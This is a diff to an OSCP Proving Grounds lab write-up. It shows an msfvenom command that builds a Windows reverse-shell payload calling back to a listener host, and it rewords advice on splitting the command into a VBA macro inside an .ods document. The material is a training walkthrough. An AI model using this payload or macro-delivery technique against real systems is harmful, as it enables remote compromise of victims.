@@ -84,7 +84,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.220 LPORT=80 -f hta-psh -
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Hepet/Hepet_2021.08.28_01h32m52s_001_.png)
 
-Because VBA's literal string can contain a maximum of 255 characters but the variable doesn't. So we have to separate the command string. Moditfying the codes whichever way you like. Then we create an ```ods``` file and add the marco.
+Because VBA's literal string can only contain a maximum of 255 characters while a variable can hold more, we need to separate the command string when modifying the code. Afterwards, we can create an `ods` file and add the macro to it.
 
 (Installing LibreOffice ```sudo apt-get install libreoffice```)
 
